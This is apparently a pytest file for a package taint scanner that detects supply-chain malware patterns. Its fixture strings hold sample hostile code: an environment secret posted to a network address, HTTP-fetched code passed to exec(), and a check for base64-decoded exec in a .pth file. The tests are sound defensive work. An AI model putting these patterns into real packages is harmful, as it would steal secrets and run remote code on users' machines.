from lineage.inspect import package_taint as pt
from tests.fixtures.builders import make_malicious_package


def test_benign_package_has_no_flows(toy_package):
    assert pt.scan(toy_package) == [] and pt.slices(toy_package) == []


def test_env_to_network_flow_through_variables(tmp_path):
    fs = pt.scan(make_malicious_package(tmp_path / "evil"))
    envs = [f for f in fs if f.id == "PKG.TAINT.ENV_EXFIL"]
    assert len(envs) == 1
    assert [e.ref for e in envs[0].evidence] == ["evilpkg/core.py:6", "evilpkg/core.py:8"]


def test_decode_exec_in_pth_is_sliced(tmp_path):
    d = make_malicious_package(tmp_path / "evil")
    fs = {f.id: f for f in pt.scan(d)}
    assert fs["PKG.TAINT.ENCODED_EXEC"].severity == "critical"
    sl = [s for s in pt.slices(d) if s.file == "evilpkg_init.pth"]
    assert sl and sl[0].start == 1 and "exec(base64.b64decode" in sl[0].code


def test_slice_only_covers_the_flow(tmp_path):
    d = tmp_path / "p"
    d.mkdir()
    (d / "m.py").write_text(
        "import os, requests\n"
        "def noise():\n    return 1\n\n"
        "def leak():\n    x = 1\n    t = os.getenv('A')\n    y = 2\n    b = t.upper()\n    requests.post('http://127.0.0.1:9/', data=b)\n"
    )
    [s] = pt.slices(d)
    assert (s.start, s.end) == (7, 10) and "noise" not in s.code


def test_remote_code_exec(tmp_path):
    d = tmp_path / "p"
    d.mkdir()
    (d / "m.py").write_text("import requests\ncode = requests.get('http://127.0.0.1:9/x').text\nexec(code)\n")
    assert [f.id for f in pt.scan(d)] == ["PKG.TAINT.REMOTE_EXEC"]


def test_untainted_network_call_is_ignored(tmp_path):
    d = tmp_path / "p"
    d.mkdir()
    (d / "m.py").write_text("import requests\nrequests.post('http://127.0.0.1:9/', data={'a': 1})\n")
    assert pt.scan(d) == []
